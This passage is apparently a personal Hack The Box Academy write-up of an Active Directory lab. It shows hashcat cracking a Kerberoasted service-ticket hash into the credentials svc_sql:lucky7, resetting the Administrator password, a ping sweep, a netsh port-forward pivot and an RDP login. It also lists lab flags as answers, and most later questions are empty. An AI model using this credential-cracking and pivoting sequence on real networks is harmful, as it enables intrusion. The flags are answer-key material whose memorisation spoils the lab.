85e775e905ab179a5097a5676c5e9648a2defff065aa587e8b1ebe7b4684e050b6e5444111f6dc7489652ccf36b5a1409b838e7f7032b2800d29f26fb7091a211f92cbb5fda2ea5b677599031937781b5742ceb350cb31b98b997db8606fb4a800d922922ea1ad3096e2a519c201145b6e5f2347bc64fdb5b7699b344740e9c4ece24d8a56e1258dbacfd3589f95cf2d8cf9149ed62fadaee39855a410c702c8e0ceff9d2d415caf3d31281e0018d360d9b7b6c4abf5395063e5981892b3ab7649f3d41c51e540c5755b758b1f516a9586cedb18a9d6a19bfe5da258f1e59c2fb6c0bf4c342df28869d0b166791d52d877f482a21ea18631703c997d6f4c0079c4e9d1e40b4f9aa4ffbba4b1ef0e7171579d1d8f6ed594d4dccc4eecffb8e381fdcd580f86d36afa85:lucky7
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*USER$DOMAIN$MSSQLSvc/SQL01.inlanefreig...6afa85
Time.Started.....: Fri Mar 10 04:06:16 2023 (0 secs)
Time.Estimated...: Fri Mar 10 04:06:16 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1034.5 kH/s (1.34ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> lovers1
Hardware.Mon.#1..: Util: 26%

Started: Fri Mar 10 04:06:16 2023
Stopped: Fri Mar 10 04:06:18 2023
```

user:pass `svc_sql:lucky7`

**Answer:** `lucky7`

### Question 4:
![](./attachments/Pasted%20image%2020230309194328.png)

Enable `RDP` using [this](https://exchangepedia.com/2016/10/enable-remote-desktop-rdp-connections-for-admins-on-windows-server-2016.html) guide.

Change `Administrator` password.

```
PS> net user Administrator P@ssword123
The command completed successfully.
```

Perform ping sweep.

```
C:\Users\Administrator>for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"

C:\Users\Administrator>ping 172.16.6.1 -n 1 -w 100   | find "Reply"

C:\Users\Administrator>ping 172.16.6.2 -n 1 -w 100   | find "Reply"

C:\Users\Administrator>ping 172.16.6.3 -n 1 -w 100   | find "Reply"
Reply from 172.16.6.3: bytes=32 time<1ms TTL=128

(...)

C:\Users\Administrator>ping 172.16.6.50 -n 1 -w 100   | find "Reply"
Reply from 172.16.6.50: bytes=32 time<1ms TTL=128

(...)

C:\Users\Administrator>ping 172.16.6.100 -n 1 -w 100   | find "Reply"
Reply from 172.16.6.100: bytes=32 time<1ms TTL=128
```

Setup pivot using `netsh.exe`.

```
C:\Windows\System32>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.231.229 connectport=3389 connectaddress=172.16.6.50


C:\Windows\System32>netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.231.229  8080        172.16.6.50     3389
```

RDP into the target box.

```
┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:svc_sql /p:'lucky7' /v:10.129.231.229:8080
```

![](./attachments/Pasted%20image%2020230310121256.png)

**Answer:** `spn$_r0ast1ng_on_@n_0p3n_f1re`

### Question 5:
![](./attachments/Pasted%20image%2020230309194337.png)

![](./attachments/Pasted%20image%2020230310121553.png)

**Answer:** `tpetty`

### Question 6:
![](./attachments/Pasted%20image%2020230309194350.png)
*Hint: Remember that not all users can read all files in an AD environment.*

```

```

**Answer:** ``

### Question 7:
![](./attachments/Pasted%20image%2020230309194414.png)

```

```

**Answer:** ``

### Question 8:
![](./attachments/Pasted%20image%2020230309194503.png)
*Hint: Remember that enumeration is an iterative process!*

```

```

**Answer:** ``

### Question 9:
![](./attachments/Pasted%20image%2020230309194524.png)
*Hint: Think about how you obtained your initial foothold in the domain.*

```

```

**Answer:** ``

### Question 10:
![](./attachments/Pasted%20image%2020230309194549.png)

```

```

**Answer:** ``

### Question 11:
![](./attachments/Pasted%20image%2020230309194557.png)

```

```

**Answer:** ``

### Question 12:
![](./attachments/Pasted%20image%2020230309194605.png)

```

```

**Answer:** ``

---
**Tags:** [[Hack The Box Academy]]